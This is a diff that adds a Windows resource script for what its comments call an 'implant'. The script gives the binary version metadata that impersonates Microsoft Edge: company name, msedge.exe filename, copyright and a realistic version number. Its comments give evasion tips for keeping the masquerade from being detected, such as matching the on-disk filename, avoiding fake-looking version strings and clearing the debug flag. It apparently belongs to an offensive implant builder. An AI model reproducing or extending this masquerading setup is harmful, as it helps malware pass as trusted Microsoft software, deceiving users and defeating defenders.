@@ -1,0 +1,71 @@
+/*
+ * resources.rc — icon + VERSIONINFO resources for the Windows implant
+ *
+ * Mock identity for process masquerading. Two things to keep consistent or
+ * the metadata becomes a signal in itself:
+ *
+ *   1. OriginalFilename MUST match the actual on-disk filename. The builder
+ *      emits {app_name}.exe (web_listener.py), so if you rename the output,
+ *      change ORIGINAL_NAME here too — Task Manager shows the real name and
+ *      a mismatch is trivially visible.
+ *
+ *   2. Keep the version 4-part (MM.mm.build.rev). Edge ships 3 numeric parts
+ *      plus a patch, and a 2-part or 1.0.0.0 version reads as fake.
+ *
+ * FileVersion and ProductVersion are normally the same for Edge; the split
+ * only exists so a real MS binary layout is reproduced.
+ */
+
+#define VER_MAJOR 120
+#define VER_MINOR 0
+#define VER_BUILD 2210
+#define VER_REV   91
+
+#define VER_STR   "120.0.2210.91"
+#define VER_STRW  L"120.0.2210.91"
+
+#define COMPANY_NAME    "Microsoft Corporation"
+#define FILE_DESCRIPTION "Microsoft Edge"
+#define FILE_NAME       "Microsoft Edge"
+#define INTERNAL_NAME   "msedge"
+#define ORIGINAL_NAME   "msedge.exe"
+#define PRODUCT_NAME    "Microsoft Edge"
+#define PRODUCT_VER     "120.0.2210.91"
+#define LEGAL_COPYRIGHT "\xA9 Microsoft Corporation. All rights reserved."
+
+IDI_ICON1 ICON "app.ico"
+
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION     VER_MAJOR,VER_MINOR,VER_BUILD,VER_REV
+PRODUCTVERSION  VER_MAJOR,VER_MINOR,VER_BUILD,VER_REV
+/* windres does not predefine VS_FFI_FILEFLAGSMASK; 0x3F is its value. */
+FILEFLAGSMASK   0x3F
+/* Deliberately 0, not VS_FF_DEBUG — a debug flag on a shipped implant is
+ * the first thing anyone checks. */
+FILEFLAGS       0x0
+/* windres predefines only a small subset of these VS_* symbols; use the
+ * literal values. VOS_NT_WINDOWS32=0x40004, VFT_APP=0x1, VFT2_UNKNOWN=0x0 */
+FILEOS          0x00040004
+FILETYPE        0x00000001
+FILESUBTYPE     0x00000000
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        /* 0409 04B0 = US English, Unicode codepage */
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      COMPANY_NAME
+            VALUE "FileDescription",  FILE_DESCRIPTION
+            VALUE "FileVersion",      VER_STRW
+            VALUE "InternalName",     INTERNAL_NAME
+            VALUE "LegalCopyright",   LEGAL_COPYRIGHT
+            VALUE "OriginalFilename", ORIGINAL_NAME
+            VALUE "ProductName",      PRODUCT_NAME
+            VALUE "ProductVersion",   PRODUCT_VER
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
